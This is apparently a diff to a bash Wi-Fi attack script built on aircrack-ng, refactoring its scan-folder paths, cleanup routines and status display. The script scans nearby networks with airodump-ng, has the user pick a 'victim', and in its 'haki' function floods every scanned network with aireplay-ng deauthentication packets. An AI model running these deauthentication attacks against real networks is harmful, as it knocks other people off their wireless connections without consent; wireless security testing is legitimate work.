@@ -33,25 +33,33 @@ requirements()
 		printf "exists" #debug info
 	fi
 
-	if [ ! -d "perish_dump" ]
-	then
-		mkdir perish_dump
-	fi
-
 	#set a trap for the end
 	trap clean_up EXIT
 }
 
 clean_up()
 {
-	#clean_up junk
-	if [ -d "perish_dump" ]
-	then
-		rm -rf perish_dump
-	fi
+	#clean_up all scan data
+	clean_up_junk
 
 	#restore your connection
 	stop_mon
+}
+
+clean_up_junk()
+{
+	if [ -d ""$PWD"/perish_dump" ]
+	then
+		rm -rf "$PWD"/perish_dump
+	fi
+}
+
+create_working_folder()
+{
+	if [ ! -d "perish_dump" ]
+	then
+		mkdir perish_dump
+	fi
 }
 
 print_menu()
@@ -70,6 +78,13 @@ print_menu()
 
 menu()
 {
+	#each time menu is called, clean up previous scans
+	clean_up_junk
+
+	#create the working directory, where we save our scan files temporarily
+	create_working_folder
+	
+	#print the menu and choose your option afterwards
 	print_menu
 
 	read option
@@ -148,7 +163,7 @@ haki()
 	while read essid
 	do
 		sudo aireplay-ng -0 128 -e $essid $mon_mode --ignore-negative-one
-	done < /perish_dump/essids
+	done < "$PWD"/perish_dump/essids
 }
 
 
@@ -239,7 +254,7 @@ select_target_network()
 		if [ "$device" != "$your_AP" ]; then #ignore yourself
 			echo "   $((i++))	$device"
 		fi
-	done < /perish_dump/essids
+	done < "$PWD"/perish_dump/essids
 
 	echo
 	echo -n "	Target your network : "
@@ -252,7 +267,7 @@ select_target_network()
 
 	[1-$i] )
 		#gets only the number of line (mac in this case) you asked for
-		target_network=$(sed -n "${network}{p;q;}" /perish_dump/essids)
+		target_network=$(sed -n "${network}{p;q;}" "$PWD"/perish_dump/essids)
 
 		#ask number of attacks only after you choose your victim
 		get_num_of_attacks
@@ -270,11 +285,11 @@ scan()
 {
 	get_mon_mode
 	scan_interval=$1
-	sudo airodump-ng $mon_mode --output-format kismet --write "/perish_dump/scan_data" > /dev/null 2>&1 & scan_ui
+	sudo airodump-ng $mon_mode --output-format kismet --write ""$PWD"/perish_dump/scan_data" > /dev/null 2>&1 & scan_ui
 	sudo killall airodump-ng
 
-	awk -F "\"*;\"*" '{print $4}' scan_data-01.kismet.csv | tail -n 2 > /perish_dump/bssids
-	awk -F "\"*;\"*" '{print $3}' scan_data-01.kismet.csv | tail -n 2 > /perish_dump/essids
+	awk -F "\"*;\"*" '{print $4}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/bssids
+	awk -F "\"*;\"*" '{print $3}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/essids
 }
 
 scan_ui()
@@ -301,6 +316,7 @@ get_num_of_attacks()
 			get_num_of_attacks
 			;;
 	esac
+	clear
 }
 
 print_status()
@@ -317,16 +333,18 @@ print_status()
 	echo " ==============================[STATUS]================================="
 	if [[ "$num_of_mon_modes" -lt 1 ]]; then
 		echo " Monitor mode not active"
+		
+		if [[ "$your_AP" == "Not-Associated" ]]; then
+			echo " You are not connected to a WiFi network!"
+		else
+			echo " Connected to $your_AP_name ($your_AP) with $your_CARD"
+			#echo " Connected to DemoAP (01:23:45:AB:CD:EF) with wlo1"
+		fi
 	else
 		echo " Monitor mode active on "$mon_mode""
 	fi
 
-	if [[ "$your_AP" == "Not-Associated" ]]; then
-		echo " You are not connected to a WiFi network!"
-	else
-		echo " Connected to $your_AP_name ($your_AP) with $your_CARD"
-		#echo " Connected to DemoAP (01:23:45:AB:CD:EF) with wlo1"
-	fi
+	
 	echo " ======================================================================="
 	echo
 }
